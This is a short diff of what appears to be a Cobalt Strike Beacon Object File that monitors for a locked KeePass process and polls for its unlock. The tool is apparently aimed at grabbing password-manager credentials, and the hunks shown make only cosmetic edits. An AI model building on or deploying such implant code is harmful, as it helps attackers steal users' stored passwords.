@@ -174,13 +174,13 @@ VOID go(char* args, int argc) {
     BeaconWakeup();
 
     DWORD dwPid = 0;
-    WCHAR szKeePass[] = { 'k','e','e','p','a','s','s','.','e','x','e', '\0' };
+    WCHAR* szKeePass = L"keepass.exe";
 
 _MONITOR:
 
     // Wait until a locked KeePass instance is found
     while (!ProcessExists(szKeePass, &dwPid) || !IsLocked(dwPid)) {
-        DWORD wait = KERNEL32$WaitForSingleObjectEx(hStop, 500, FALSE);     // 500ms delay for process detection
+        DWORD wait = KERNEL32$WaitForSingleObjectEx(hStop, 500, FALSE); // 500ms delay for process detection
         if (wait == WAIT_OBJECT_0 || wait != WAIT_TIMEOUT)
             goto _CLEANUP;
     }
@@ -206,7 +206,7 @@ _MONITOR:
             USER32$DispatchMessageA(&msg);
 
         DWORD now = KERNEL32$GetTickCount();
-        if (now - lastCheck >= 200) {                                       // 200ms delay for unlock detection
+        if (now - lastCheck >= 200) { // 200ms delay for unlock detection
             lastCheck = now;
             if (!ProcessExists(szKeePass, &dwPid) || !IsLocked(dwPid))
                 break;
